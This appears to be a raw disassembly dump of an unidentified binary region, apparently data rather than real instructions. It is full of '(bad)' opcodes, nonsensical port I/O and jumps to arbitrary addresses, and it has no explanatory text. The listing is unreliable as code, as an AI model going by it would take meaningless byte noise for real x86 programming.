  4225d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225d7:	fldcw  WORD PTR [edx]
  4225d9:	dec    edi
  4225da:	inc    eax
  4225db:	(bad)  
  4225dc:	addr16 sub esp,esi
  4225df:	mov    ecx,0x78ac3387
  4225e4:	retf   
  4225e5:	sub    DWORD PTR [eax],ebx
  4225e7:	repz push 0x83915b3c
  4225ed:	or     DWORD PTR [edx],ebx
  4225ef:	sbb    DWORD PTR [edi-0x2af8c43a],edx
  4225f5:	push   ds
  4225f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225f7:	add    DWORD PTR [ebx],edx
  4225f9:	repnz lahf 
  4225fb:	mov    esi,0xac8846f9
  422600:	in     al,dx
  422601:	neg    BYTE PTR [eax]
  422603:	jg     0x422616
  422605:	retf   
  422606:	inc    esp
  422607:	mov    esp,0x2865df63
  42260c:	inc    ebp
  42260d:	dec    edx
  42260e:	leave  
  42260f:	xchg   bl,dl
  422611:	sub    eax,0xfa8d9bc0
  422616:	shl    DWORD PTR [edi+0xe],0xa4
  42261a:	xor    DWORD PTR [ebp-0x16719556],ebx
  422620:	(bad)  
  422621:	into   
  422622:	lds    ebp,FWORD PTR [edx-0x1f]
  422625:	or     dl,0x98
  422628:	scas   eax,DWORD PTR es:[edi]
  422629:	mov    edx,0x8e278e33
  42262e:	push   0xfffffffb
  422630:	pop    esp
  422631:	jl     0x42260b
  422633:	push   ss
  422634:	iret   
  422635:	in     al,dx
  422636:	jge    0x422697
  422638:	sbb    ebp,esp
  42263a:	push   0xffffffe8
  42263c:	stc    
  42263d:	lahf   
  42263e:	ins    DWORD PTR es:[edi],dx
  42263f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422640:	inc    edi
  422641:	pop    esp
  422642:	pop    edx
  422643:	jmp    0x82f697d5
  422648:	inc    eax
  422649:	ret    
  42264a:	dec    edi
  42264b:	add    edi,edx
  42264d:	clc    
  42264e:	xor    DWORD PTR [eax],0xd057aa5b
  422654:	xchg   esp,eax
  422655:	js     0x422666
  422657:	add    al,0xf4
  422659:	mov    DWORD PTR [edi],0xcd173bcd
  42265f:	pop    ebx
  422660:	out    dx,al
  422661:	jns    0x42268c
  422663:	xchg   edi,eax
  422664:	or     BYTE PTR [edx+edx*2-0x7b7d9b30],dl
  42266b:	adc    DWORD PTR [ebp+0x67a2278d],0x415790cd
  422675:	pop    ebx
  422676:	mov    edx,0xfd00903f
  42267b:	test   al,0x8c
  42267d:	mov    ?,WORD PTR [edi+0x7e]
  422680:	mov    ebx,0x481fe9d2
  422685:	mov    esp,edi
  422687:	cmp    al,0x89
  422689:	xchg   ebx,eax
  42268a:	fisttp DWORD PTR [esi]
  42268c:	pop    ecx
  42268d:	inc    esp
  42268e:	sub    eax,0x41aa04bd
  422693:	pop    es
  422694:	ins    BYTE PTR es:[edi],dx
  422695:	retf   
  422696:	das    
  422697:	cdq    
  422698:	sub    bh,al
  42269a:	jns    0x4226d3
  42269c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42269d:	(bad)  
  42269e:	out    0xf1,eax
  4226a0:	idiv   al
  4226a2:	arpl   WORD PTR [edx+0x3c],bx
  4226a5:	popf   
  4226a6:	xchg   edx,eax
  4226a7:	sub    ecx,esp
  4226a9:	fst    st(6)
  4226ab:	ret    0xa2d6
  4226ae:	sbb    eax,0x9cdcb6b7
  4226b3:	xchg   edx,eax
  4226b4:	dec    ebp
  4226b5:	add    DWORD PTR [esi],ebx
  4226b7:	mov    esp,0xdb8a0e0d
  4226bc:	and    ch,BYTE PTR [esi]
  4226be:	xchg   esp,eax
  4226bf:	push   es
  4226c0:	(bad)  
  4226c2:	outs   dx,BYTE PTR ds:[esi]
  4226c3:	pop    eax
  4226c4:	sbb    eax,0xa6efb991
  4226c9:	out    dx,eax
  4226ca:	push   0x67
  4226cc:	jmp    0x3f76db06
  4226d1:	jge    0x4226f2
  4226d3:	out    0xc0,al
  4226d5:	inc    edi
  4226d6:	dec    edi
  4226d7:	retf   0x5509
  4226da:	jno    0x4226ed
  4226dc:	shl    ebp,0xd2
  4226df:	icebp  
  4226e0:	fwait
  4226e1:	add    eax,esp
  4226e3:	cwde   
  4226e4:	or     cl,ch
  4226e6:	sub    ebp,DWORD PTR [ebp-0x44]
  4226e9:	dec    ecx
  4226ea:	jns    0x422708
  4226ec:	fdiv   QWORD PTR [esi+0x526425]
  4226f2:	adc    ebp,DWORD PTR [edi-0x12]
  4226f5:	test   eax,0x3f811c4a
  4226fa:	cmp    DWORD PTR [ecx+0x2b],0x4f
  4226fe:	fadd   QWORD PTR [ecx+edi*4]
  422701:	jb     0x4226f6
  422703:	stos   DWORD PTR es:[edi],eax
  422704:	jnp    0x4226e0
  422706:	inc    edx
  422707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422708:	cmp    al,0xfa
  42270a:	cmp    ebp,DWORD PTR [esp+edi*8-0x27]
  42270e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42270f:	mov    dh,0x41
  422711:	mov    ebx,0x1cf9edad
  422716:	scas   eax,DWORD PTR es:[edi]
  422717:	lea    ebp,[ecx-0x79d5f82a]
  42271d:	cs out dx,al
  42271f:	int    0x3b
  422721:	sar    bl,0xff
  422724:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  422726:	mov    eax,ds:0x8fadb0d
  42272b:	rcl    BYTE PTR [eax-0x73e205e2],cl
  422731:	retf   0xfc36
  422734:	inc    esp
  422735:	mov    ah,0x83
  422737:	cli    
  422738:	dec    esp
  422739:	push   0xe1ea2937
  42273e:	or     bl,ch
  422740:	cmp    cl,BYTE PTR [eax-0x45fa0ede]
  422746:	shld   DWORD PTR [ebx-0x1a],eax,cl
  42274a:	and    esi,edi
  42274c:	inc    ecx
  42274d:	push   eax
  42274e:	sbb    al,0x27
  422750:	frstor [edx-0x398ae5b1]
  422756:	mov    dl,0x64
  422758:	dec    eax
  422759:	(bad)  
  42275a:	jmp    0x422791
  42275c:	jp     0x42272a
  42275e:	es sub eax,edi
  422761:	scas   eax,DWORD PTR es:[edi]
  422762:	xor    dh,BYTE PTR [ebx-0x3e36a2e7]
  422768:	push   0x13b700bf
  42276d:	push   esp
  42276e:	dec    esp
  42276f:	bound  edi,QWORD PTR [ecx+0x7df7efdb]
  422775:	pop    ds
  422776:	ss add al,0x83
  422779:	push   ds
  42277a:	push   esi
  42277b:	xchg   ebp,eax
  42277c:	(bad)  
  42277d:	fcomip st,st(0)
  42277f:	push   ecx
  422780:	xchg   edi,eax
  422781:	(bad)  
  422782:	or     eax,0xcaedac86
  422787:	fwait
  422788:	jb     0x422762
  42278a:	or     al,BYTE PTR [esi-0x72be6179]
  422790:	fucom  st(2)
  422792:	cdq    
  422793:	pop    esi
  422794:	push   0xc0b67f28
  422799:	pop    es
  42279a:	sbb    eax,0xedfbe7d7
  42279f:	sub    al,0x9c
  4227a1:	xchg   esp,eax
  4227a2:	test   eax,0x191cc81a
  4227a7:	sub    DWORD PTR [edi+0x54c77915],0xffffff95
  4227ae:	dec    eax
  4227af:	or     ebp,DWORD PTR [ecx-0x7f]
  4227b2:	mov    edi,0x4c557df8
  4227b7:	mov    eax,ds:0xf2e7cb36
  4227bc:	mov    edx,0xbadabdc8
  4227c2:	mov    edx,0xb96436
  4227c7:	popa   
  4227c8:	mov    al,0x7
  4227ca:	scas   al,BYTE PTR es:[edi]
  4227cb:	fwait
  4227cc:	sub    edx,edx
  4227ce:	pushf  
  4227cf:	xor    DWORD PTR ds:0xc3fa423,edi
  4227d5:	pop    edx
  4227d6:	fisubr DWORD PTR ds:0x77878dd4
  4227dc:	outs   dx,DWORD PTR ds:[esi]
  4227dd:	icebp  
  4227de:	push   es
  4227df:	leave  
  4227e0:	pop    es
  4227e1:	stos   DWORD PTR es:[edi],eax
  4227e2:	out    dx,eax
  4227e3:	repnz and ebp,DWORD PTR [ecx+0x862c8db]
  4227ea:	nop
  4227eb:	jle    0x4227e3
  4227ed:	cmp    eax,0x4718b1a7
  4227f2:	cwde   
  4227f3:	mov    esp,0x9d3c67ad
  4227f8:	ja     0x422862
  4227fa:	int3   
  4227fb:	and    BYTE PTR [edi-0x44],al
  4227fe:	pop    esi
  4227ff:	xchg   ecx,eax
  422800:	sbb    BYTE PTR [edi-0x67690d52],0x85
  422807:	mov    ebp,0x362eefac
  42280c:	jge    0x422870
  42280e:	mov    edx,0x3943c3c8
  422813:	xchg   ebx,eax
  422814:	xchg   ecx,eax
  422815:	les    esi,FWORD PTR [ecx+esi*2]
  422818:	jp     0x42288b
  42281a:	out    0x77,al
  42281c:	push   ss
  42281d:	popa   
  42281e:	mov    WORD PTR [ebp+eax*1+0x3b],gs
  422822:	iret   
  422823:	lds    esp,FWORD PTR [ebp-0x2c]
  422826:	mov    bh,BYTE PTR [esi+0x6856b5f9]
  42282c:	iret   
  42282d:	sahf   
  42282e:	mov    eax,0xc566ef4c
  422833:	jae    0x4227e5
  422835:	sub    al,0xdf
  422837:	jmp    DWORD PTR [ecx-0x5ed0d95b]
  42283d:	jle    0x4227cd
  42283f:	fwait
  422840:	push   ebp
  422841:	sub    ebp,DWORD PTR [esi+esi*4+0x3ec8570c]
  422848:	in     al,0x3c
  42284a:	call   0xe242e1ba
  42284f:	cwde   
  422850:	xchg   edx,eax
  422851:	rol    DWORD PTR [ebp+0x52],1
  422854:	jbe    0x42284a
  422856:	add    edi,DWORD PTR [edi-0x7ad1c0c0]
  42285c:	xor    bh,BYTE PTR [esi]
  42285e:	push   edi
  42285f:	inc    ebx
  422860:	jno    0x4228bf
  422862:	(bad)  
  422863:	xchg   edi,eax
  422864:	adc    eax,0xc4773dad
  422869:	jmp    0xa0847baa
  42286e:	mov    esi,0x7c787bf9
  422873:	bound  ebx,QWORD PTR [ebp-0x28]
  422876:	xor    eax,0xfe25c880
  42287b:	mov    eax,ds:0x9825a56e
  422880:	adc    eax,0x361b4f9c
  422885:	imul   ebx,DWORD PTR es:[esi+0x6c],0xffaa455a
  42288d:	xchg   DWORD PTR [esi],ebp
  42288f:	cmp    DWORD PTR [esp+edi*8],eax
  422892:	pop    esp
  422893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422894:	xchg   edi,eax
  422895:	mov    ?,WORD PTR [esi]
  422897:	pusha  
  422898:	outs   dx,DWORD PTR ds:[esi]
  422899:	scas   eax,DWORD PTR es:[edi]
  42289a:	add    DWORD PTR [esi-0x525ce687],ecx
  4228a0:	(bad)  [ebp+0xbac32f3]
  4228a6:	data16 arpl dx,di
  4228a9:	sahf   
  4228aa:	mov    ds:0xab863e43,al
  4228af:	inc    esi
  4228b0:	mov    dh,0x29
  4228b2:	ins    BYTE PTR es:[edi],dx
  4228b3:	fmulp  st(3),st
  4228b5:	aaa    
  4228b6:	cmp    DWORD PTR [edi+0x4ad12aa8],0x75
  4228bd:	aam    0x6f
  4228bf:	dec    eax
  4228c0:	add    DWORD PTR [eax-0x7e],esi
  4228c3:	push   edi
  4228c4:	(bad)  
  4228c5:	scas   al,BYTE PTR es:[edi]
  4228c6:	sub    BYTE PTR [ebx-0x57],ch
  4228c9:	(bad)  
  4228ca:	ja     0x422901
  4228cc:	jle    0x422932
  4228ce:	fisttp QWORD PTR [ecx+0x57]
  4228d1:	stos   DWORD PTR es:[edi],eax
  4228d2:	out    dx,al
  4228d3:	push   esp
  4228d4:	shl    BYTE PTR [esi+0x4],0x5a
  4228d8:	mov    al,0xce
  4228da:	arpl   WORD PTR [edi+0x2e52566],si
  4228e0:	(bad)  
  4228e1:	sti    
  4228e2:	imul   eax,DWORD PTR [edx],0x6c81cea7
  4228e8:	not    BYTE PTR [ebx+0x20]
  4228eb:	pop    ecx
  4228ec:	push   edi
  4228ed:	lahf   
  4228ee:	add    esi,DWORD PTR [ebx-0x20]
  4228f1:	mov    eax,0x2388fe37
  4228f6:	mov    esi,0x7fe31e61
  4228fb:	loopne 0x422950
  4228fd:	dec    ebp
  4228fe:	cwde   
  4228ff:	fs out dx,eax
  422901:	sar    DWORD PTR [ecx+0x44142923],0xdc
  422908:	nop
  422909:	push   cs
  42290a:	xchg   esi,eax
  42290b:	dec    edx
  42290c:	fist   WORD PTR [edx+0x4f]
  42290f:	sbb    eax,0xb835d576
  422914:	dec    edi
  422915:	setno  BYTE PTR [ecx]
  422918:	gs retf 
  42291a:	outs   dx,DWORD PTR ds:[esi]
  42291b:	addr16 jmp 0x4228cf
  42291e:	test   dh,ch
  422920:	gs jg  0x42291c
  422923:	cld    
  422924:	ds jge 0x422994
  422927:	(bad)  
  422928:	mov    bh,0x29
  42292a:	xchg   esp,eax
  42292b:	mov    ebp,0x642dbbc5
  422930:	pop    edi
  422931:	add    al,0x8d
  422933:	xor    eax,0x1b8ae8e0
  422938:	(bad)  
  422939:	je     0x422964
  42293b:	mov    fs,WORD PTR [esi]
  42293d:	mov    dh,0xe8
  42293f:	and    DWORD PTR [eax+0x6ca0ce],esp
  422945:	add    BYTE PTR [eax],al
  422947:	add    BYTE PTR [eax],al
  422949:	add    BYTE PTR [eax+0x50],cl
  42294c:	push   eax
  42294d:	dec    ebp
  42294e:	pop    eax
  42294f:	dec    ebp
  422950:	pop    ebp
  422951:	push   ebp
  422952:	stos   DWORD PTR es:[edi],eax
  422953:	mov    ch,0xf6
  422955:	stc    
  422956:	mov    WORD PTR [edx-0x481d409d],gs
  42295c:	add    DWORD PTR [eax],eax
  42295e:	add    BYTE PTR [esi],0x0
  422961:	add    BYTE PTR [eax+0x45],ah
  422964:	sbb    esp,DWORD PTR [ebp+0x63]
  422967:	xor    DWORD PTR [ecx-0x1b],esp
  42296a:	xchg   ebp,eax
  42296b:	sar    esp,cl
  42296d:	mov    al,ds:0x914a63f9
  422972:	test   eax,0xea1dbe60
  422977:	setbe  BYTE PTR [eax+0x8]
  42297b:	or     al,0xc3
  42297d:	addr16 nop
  42297f:	xor    eax,DWORD PTR [edx+ecx*4-0x69]
  422983:	jo     0x422946
  422985:	(bad)  
  422987:	push   0x1a47a46d
  42298c:	mov    bl,0x2
  42298e:	das    
  42298f:	cmp    bh,BYTE PTR [edx-0x59]
  422992:	sub    al,0x49
  422994:	lods   eax,DWORD PTR ds:[esi]
  422995:	retf   
  422996:	jmp    0x57bc:0x4684c11a
  42299d:	fcomip st,st(5)
  42299f:	jecxz  0x4229fd
  4229a1:	cmp    eax,0x8266bdac
  4229a6:	xlat   BYTE PTR ds:[ebx]
  4229a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229a8:	loop   0x422a1c
  4229aa:	rol    BYTE PTR [ecx],0x39
  4229ad:	jmp    0x422937
  4229af:	fbld   TBYTE PTR [ecx-0x7e41ca10]
  4229b5:	out    0xaa,eax
  4229b7:	(bad)  
  4229b8:	jmp    0x2e14:0xf0c3b6f
  4229bf:	mov    bl,BYTE PTR [ebp-0x31f28b5c]
  4229c5:	fsubr  QWORD PTR [esi-0x1f]
  4229c8:	ds pop ss
  4229ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229cb:	mov    eax,ds:0xc59c4da3
  4229d0:	jne    0x422a05
  4229d2:	cmc    
  4229d3:	es pop edi
  4229d5:	xor    ah,BYTE PTR ds:0x5f690e1f
  4229db:	add    BYTE PTR [esi],bl
  4229dd:	out    0x5f,al
  4229df:	mov    DWORD PTR [edx+0x18],edi
  4229e2:	das    
  4229e3:	cmp    esp,eax
  4229e5:	loop   0x422989
  4229e7:	cli    
  4229e8:	pop    ss
  4229e9:	push   ebx
  4229ea:	sbb    al,0x22
  4229ec:	mov    bh,0x45
  4229ee:	outs   dx,BYTE PTR ds:[esi]
  4229ef:	lahf   
  4229f0:	pushf  
  4229f1:	ins    BYTE PTR es:[edi],dx
  4229f2:	jge    0x422a53
  4229f4:	cmp    al,0xd
  4229f6:	fidiv  DWORD PTR [ebp+0x6cc3e6e5]
  4229fc:	adc    BYTE PTR [ebx+0x4e],al
  4229ff:	add    al,0x8
  422a01:	inc    eax
  422a02:	mov    WORD PTR [edx+0x10],?
  422a05:	adc    al,0xc9
  422a07:	xchg   edx,eax
  422a08:	cwde   
  422a09:	mov    DWORD PTR [ecx-0x32b7dd7],esi
  422a0f:	scas   eax,DWORD PTR es:[edi]
  422a10:	mov    ah,bh
  422a12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a13:	push   ecx
  422a14:	adc    DWORD PTR [edi-0x48],esi
  422a17:	(bad)  
  422a18:	lods   al,BYTE PTR ds:[esi]
  422a19:	adc    eax,0x1841a5b9
  422a1e:	and    DWORD PTR [edx],edi
  422a20:	jge    0x422a34
  422a22:	dec    eax
  422a23:	pushf  
  422a24:	ret    0x4a49
  422a27:	mov    eax,0xc7c86a75
  422a2c:	addr16 test eax,0x8e71c012
  422a32:	mov    cs,edi
  422a34:	and    edx,ecx
  422a36:	(bad)  
  422a37:	stc    
  422a38:	call   0x40780ea2
  422a3d:	jge    0x4229f8
  422a3f:	dec    ebx
  422a40:	pop    es
  422a41:	xor    DWORD PTR [edi],ebx
  422a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a44:	dec    edx
  422a45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a46:	xchg   esp,eax
  422a47:	call   0x6c9b906a
  422a4c:	push   esp
  422a4d:	sbb    BYTE PTR [eax+0x6e],al
  422a50:	popa   
  422a51:	orps   xmm2,XMMWORD PTR [eax-0x31]
  422a55:	push   esp
  422a56:	add    ecx,edx
  422a58:	gs out dx,eax
  422a5a:	out    0xb2,eax
  422a5c:	test   BYTE PTR [ebx],al
  422a5e:	xor    al,0xc
  422a60:	mov    edx,ebx
  422a62:	mov    cl,0xd9
  422a64:	adc    ebx,0xffffffbc
  422a67:	push   esi
  422a68:	ins    DWORD PTR es:[edi],dx
  422a69:	mov    dl,0x76
  422a6b:	jp     0x422a54
  422a6d:	dec    eax
  422a6e:	(bad)
  422a72:	pop    es
  422a73:	arpl   WORD PTR [eax+0x38],bx
  422a76:	lahf   
  422a77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a78:	xchg   DWORD PTR [edi-0x72],esp
  422a7b:	popf   
  422a7c:	dec    ecx
  422a7d:	mov    ecx,0x785b946a
  422a82:	or     ecx,0x1e9a3da0
  422a88:	ret    0xd697
  422a8b:	outs   dx,BYTE PTR ds:[esi]
  422a8c:	and    al,BYTE PTR [esi+ebx*1]
  422a8f:	mov    ah,BYTE PTR [edi]
  422a91:	(bad)  
  422a92:	int    0x42
  422a94:	cli    
  422a95:	sar    BYTE PTR [ebx*8+0x6d36242d],1
  422a9c:	dec    ecx
  422a9d:	xchg   esi,eax
  422a9e:	mov    bh,0xaa
  422aa0:	jecxz  0x422b1b
  422aa2:	mov    ds:0xcbcd148a,eax
  422aa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422aa8:	rol    BYTE PTR [ebp+eiz*1-0x1cffcb28],0xc9
  422ab0:	xor    esi,DWORD PTR [edi]
  422ab2:	stos   BYTE PTR es:[edi],al
  422ab3:	mov    bh,0x5c
  422ab5:	jo     0x422acc
  422ab7:	int    0x47
  422ab9:	inc    ecx
  422aba:	(bad)  
  422abb:	gs adc eax,0xe2da866d
  422ac1:	adc    ah,BYTE PTR [eax+0x6e]
  422ac4:	mov    dh,bh
  422ac6:	psubsb mm2,mm2
  422ac9:	dec    edi
  422aca:	scas   eax,DWORD PTR es:[edi]
  422acb:	popa   
  422acc:	inc    ebx
  422acd:	call   0x204d686c
  422ad2:	pop    es
  422ad3:	fidiv  DWORD PTR [ecx]
  422ad5:	test   BYTE PTR [ecx],ch
  422ad7:	sahf   
  422ad8:	aas    
  422ad9:	fcomi  st,st(7)
  422adb:	fisttp DWORD PTR [esi-0x1c]
  422ade:	jg     0x422b4d
  422ae0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ae1:	loopne 0x422a8d
  422ae3:	mov    ebp,0x29ca4ecb
  422ae8:	mov    ecx,0x7c26a247
  422aed:	int    0xf7
  422aef:	std    
  422af0:	pop    ecx
  422af1:	pop    ebp
  422af2:	out    dx,eax
  422af3:	int    0x83
  422af5:	sti    
  422af6:	xor    eax,0xd3b78f76
  422afb:	push   eax
  422afc:	xor    bh,BYTE PTR [ecx+edi*4+0x323a7bf3]
  422b03:	mov    edx,0x6c713fd5
  422b08:	ja     0x422b49
  422b0a:	jnp    0x422b36
  422b0c:	pop    edi
  422b0d:	hlt    
  422b0e:	test   DWORD PTR [ecx-0x1e50a715],ecx
  422b14:	inc    eax
  422b15:	push   ecx
  422b16:	mov    DWORD PTR [edi+0x70],edx
  422b19:	aas    
  422b1a:	ficom  DWORD PTR [esi]
  422b1c:	jecxz  0x422aac
  422b1e:	xlat   BYTE PTR ds:[ebx]
  422b1f:	jae    0x422ae9
  422b21:	hlt    
  422b22:	fidivr DWORD PTR [eax+edi*2-0x473bac1c]
  422b29:	aas    
  422b2a:	std    
  422b2b:	cmp    edx,ebp
  422b2d:	mov    dh,0xca
  422b2f:	into   
  422b30:	push   edx
  422b31:	retf   
  422b32:	mov    bh,0xe5
  422b34:	js     0x422b19
  422b36:	ja     0x422ae9
  422b38:	mov    WORD PTR [edi+0x11],fs
  422b3b:	hlt    
  422b3c:	out    0xee,eax
  422b3e:	sub    DWORD PTR [edi],edi
  422b40:	icebp  
  422b41:	enter  0xd03,0x7d
  422b45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b46:	mov    eax,ds:0x33383162
  422b4b:	shl    BYTE PTR [esp+eiz*8+0x1f],1
  422b4f:	lods   eax,DWORD PTR ds:[esi]
  422b50:	and    al,0xff
  422b52:	out    0x6e,eax
  422b54:	shl    BYTE PTR [esi+0x25],0xb4
  422b58:	in     al,0xdd
  422b5a:	enter  0x5921,0xe9
  422b5e:	or     BYTE PTR [esi],bl
  422b60:	dec    ebp
  422b61:	push   esp
  422b62:	cmp    dl,bh
  422b64:	outs   dx,BYTE PTR es:[esi]
  422b66:	push   edx
  422b67:	test   DWORD PTR [esi+0x69],esi
  422b6a:	xor    ecx,edi
  422b6c:	jmp    0xbfda3797
  422b71:	test   DWORD PTR [ecx],ebp
  422b73:	xchg   BYTE PTR [esi-0x674cd3de],bl
  422b79:	fs loope 0x422bb0
  422b7c:	dec    ebx
  422b7d:	or     ah,BYTE PTR [esi+0x2195eab2]
  422b83:	push   ecx
  422b84:	mov    dh,0x4a
  422b86:	movhps xmm3,QWORD PTR [ecx-0x51]
  422b8a:	pop    es
  422b8b:	bnd jae 0x422b5b
  422b8e:	loopne 0x422bbe
  422b90:	int    0x43
  422b92:	leave  
  422b93:	int3   
  422b94:	cmc    
  422b95:	jmp    0x6f2e:0x87203a80
  422b9c:	sbb    BYTE PTR [edi],bh
  422b9e:	in     al,0x1e
  422ba0:	cmp    al,BYTE PTR [ebx]
  422ba2:	xchg   edi,eax
  422ba3:	mov    bl,0xf4
  422ba5:	ss ds ror eax,cl
  422ba9:	inc    ebp
  422baa:	push   0x1ef887d7
  422baf:	dec    edx
  422bb0:	(bad)  
  422bb2:	fmulp  st(6),st
  422bb4:	jg     0x422b61
  422bb6:	jne    0x422c12
  422bb8:	sbb    eax,0xabeb3253
  422bbd:	scas   eax,DWORD PTR es:[di]
  422bbf:	jno    0x422c28
  422bc1:	or     BYTE PTR [esi],cl
  422bc3:	pop    ss
  422bc4:	dec    ecx
  422bc5:	pop    edx
  422bc6:	data16 ins BYTE PTR es:[edi],dx
  422bc8:	retf   
  422bc9:	mov    ?,WORD PTR [eax]
  422bcb:	sub    ecx,DWORD PTR [eax]
  422bcd:	mov    ecx,0x6d234103
  422bd2:	and    eax,0xebec70a7
  422bd7:	cs push ds
  422bd9:	jmp    0x6af8:0x875dd33b
  422be0:	shr    BYTE PTR [edx+0x37],cl
  422be3:	pop    edx
  422be4:	or     al,0xbf
  422be6:	adc    edx,DWORD PTR [esi+0x53]
  422be9:	fild   QWORD PTR [ebx+ecx*4]
  422bec:	scas   eax,DWORD PTR es:[edi]
  422bed:	pop    ds
  422bee:	mov    ch,0x4d
  422bf0:	cmpps  xmm5,xmm5,0x83
  422bf4:	lahf   
  422bf5:	ret    
  422bf6:	sbb    eax,0xc8b33414
  422bfb:	arpl   WORD PTR [edi],ax
  422bfd:	pop    ebx
  422bfe:	pop    DWORD PTR [esi]
  422c00:	leave  
  422c01:	fistp  QWORD PTR ds:0x52c59e3d
  422c07:	xchg   DWORD PTR ds:0x3e725f79,ebx
  422c0d:	stos   BYTE PTR es:[edi],al
  422c0e:	sub    BYTE PTR [eax],dh
  422c10:	sub    dl,BYTE PTR [ebx+0x35]
  422c13:	sbb    eax,0x9c973cc6
  422c18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c19:	shr    BYTE PTR [ebp+0x6baf57a0],cl
  422c1f:	xor    ebx,DWORD PTR [edx+edx*1]
  422c22:	xlat   BYTE PTR ds:[ebx]
  422c23:	sahf   
  422c24:	sub    edx,edx
  422c26:	jmp    0x422bc9
  422c28:	mov    edi,0xdd6fe687
  422c2d:	push   edx
  422c2e:	outs   dx,BYTE PTR ds:[esi]
  422c2f:	test   DWORD PTR [esi],0xa8f729c
  422c35:	cs jl  0x422c0c
  422c38:	and    al,0x36
  422c3a:	push   ebx
  422c3b:	out    0xa7,al
  422c3d:	xor    al,ch
  422c3f:	mov    bh,BYTE PTR [edi]
  422c41:	lds    edx,FWORD PTR [ebp-0x21]
  422c44:	retf   
  422c45:	adc    ch,0x5e
  422c48:	dec    esp
  422c49:	call   0x7ad3a966
  422c4e:	mov    ds:0x5cab94b9,al
  422c53:	cdq    
  422c54:	test   al,0x3f
  422c56:	pop    ss
  422c57:	enter  0x24fe,0xc2
  422c5b:	push   ecx
  422c5c:	adc    eax,0xa02acf86
  422c61:	in     eax,dx
  422c62:	(bad)  
  422c65:	xlat   BYTE PTR ds:[ebx]
  422c66:	and    dl,BYTE PTR [edx]
  422c68:	sub    al,0xd0
  422c6a:	and    eax,0x7596244
  422c6f:	gs pop eax
  422c71:	add    ah,dh
  422c73:	in     al,0x55
  422c75:	neg    BYTE PTR [esp+ebp*2+0x7c]
  422c79:	ret    
  422c7a:	xor    bh,BYTE PTR [ebp-0xd]
  422c7d:	imul   esp,DWORD PTR [edi],0xec191784
  422c83:	sbb    DWORD PTR [ebx+ebp*8],edi
  422c86:	cmp    edi,ebp
  422c88:	(bad)  
  422c89:	out    dx,eax
  422c8a:	shl    BYTE PTR [edi],cl
  422c8c:	jecxz  0x422c9e
  422c8e:	stc    
  422c8f:	retf   
  422c90:	(bad)  
  422c91:	jmp    0x422c44
  422c93:	and    eax,0x83170acb
  422c98:	push   ebp
  422c99:	clc    
  422c9a:	call   0x31092438
  422c9f:	cs push cs
  422ca1:	mov    ds:0x21fa094c,eax
  422ca6:	mov    DWORD PTR [ebx],esi
  422ca8:	and    bh,BYTE PTR [ebp+0x861a3f3]
  422cae:	aam    0xaf
  422cb0:	(bad)  
  422cb2:	es leave 
  422cb4:	jmp    DWORD PTR [edx-0x6c653070]
  422cba:	or     DWORD PTR [ebp-0x49],ebx
  422cbd:	jne    0x422c69
  422cbf:	sbb    al,0x72
  422cc1:	and    ah,BYTE PTR [edx+0x5823be1b]
  422cc7:	sub    esi,DWORD PTR [ebx]
  422cc9:	adc    esp,edi
  422ccb:	add    dh,ah
  422ccd:	int3   
  422cce:	loope  0x422cd7
  422cd0:	out    0xfe,eax
  422cd2:	dec    ebx
  422cd3:	test   BYTE PTR [ecx-0x39],dh
  422cd6:	outs   dx,BYTE PTR ds:[esi]
  422cd7:	call   FWORD PTR [ebp+ecx*1-0x5b]
  422cdb:	shr    DWORD PTR [ebx],cl
  422cdd:	push   edi
  422cde:	push   ecx
  422cdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ce0:	mov    dl,0xd9
  422ce2:	xor    DWORD PTR [ebp+0x5b19d12],0x6a
  422ce9:	rcr    DWORD PTR ds:0xbde5f6ae,0x3
  422cf0:	mov    cl,0x0
  422cf2:	out    0xb0,eax
  422cf4:	data16 loope 0x422cbe
  422cf7:	adc    al,0x6d
  422cf9:	in     al,dx
  422cfa:	jbe    0x422d1b
  422cfc:	dec    ebx
  422cfd:	xchg   ebp,eax
  422cfe:	push   es
  422cff:	scas   al,BYTE PTR es:[edi]
  422d00:	dec    edx
  422d01:	adc    edi,eax
  422d03:	inc    eax
  422d04:	lea    ebx,fs:[ebp+0x40c801ec]
  422d0b:	mov    al,ds:0x65e4906a
  422d10:	xchg   edx,eax
  422d11:	and    BYTE PTR [edi-0x2d],cl
  422d14:	sti    
  422d15:	or     DWORD PTR [edi-0x6b4cc282],ecx
  422d1b:	into   
  422d1c:	xchg   ebp,eax
  422d1d:	(bad)  
  422d1e:	pop    edx
  422d1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d20:	ret    0x444c
  422d23:	pop    ebp
  422d24:	jnp    0x422d3a
  422d26:	cmp    al,0xd9
  422d28:	mov    dh,bl
  422d2a:	popf   
  422d2b:	ja     0x422ce6
  422d2d:	enter  0x2df7,0xd3
  422d31:	adc    dh,BYTE PTR [edx+ecx*4]
  422d34:	test   al,0x8f
  422d36:	lods   eax,DWORD PTR ds:[esi]
  422d37:	inc    esp
  422d38:	and    DWORD PTR [ecx+eiz*8-0x27],ebp
  422d3c:	xchg   ebp,eax
  422d3d:	test   edx,ecx
  422d3f:	mov    ds:0xbc480171,eax
  422d44:	fs ins DWORD PTR es:[edi],dx
  422d46:	and    al,0x87
  422d48:	dec    edi
  422d49:	sahf   
